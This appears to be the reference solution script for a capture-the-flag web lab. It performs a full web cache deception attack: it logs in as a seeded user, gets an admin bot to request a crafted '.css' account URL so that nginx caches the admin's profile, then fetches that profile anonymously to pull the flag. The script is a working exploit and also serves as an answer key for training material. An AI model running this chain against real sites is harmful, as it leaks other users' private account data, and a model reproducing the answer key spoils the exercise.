#!/usr/bin/env bash
# ============================================================
# CacheKey (labs01) — reference solution: Web Cache Deception
#
# Chain: login as a regular user -> submit /api/account/<unique>.css
# to the admin review queue -> admin bot's logged-in GET gets cached
# by nginx under a cookie-free key -> re-fetch anonymously -> flag.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8081)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8081}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

jar="$(mktemp)"
trap 'rm -f "$jar"' EXIT
suffix="pwned-$$-$RANDOM.css"
target="/api/account/$suffix"

echo "[*] logging in as seeded user attacker" >&2
curl -fsS -c "$jar" -o /dev/null \
  --data-urlencode 'username=attacker' \
  --data-urlencode 'password=attacker123' \
  "$BASE/login"

echo "[*] submitting $target to the admin review queue" >&2
curl -fsS -b "$jar" -o /dev/null --data-urlencode "url=$target" "$BASE/report"

echo "[*] polling anonymously until the cached admin profile appears (bot runs every 5s)" >&2
flag=""
for _ in $(seq 1 45); do
  sleep 2
  body="$(curl -sS "$BASE$target" 2>/dev/null || true)"
  if flag="$(grep -Eo "$FLAG_RE" <<<"$body" | head -n1)" && [[ -n "$flag" ]]; then
    break
  fi
done

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: no cached flag found at $target" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
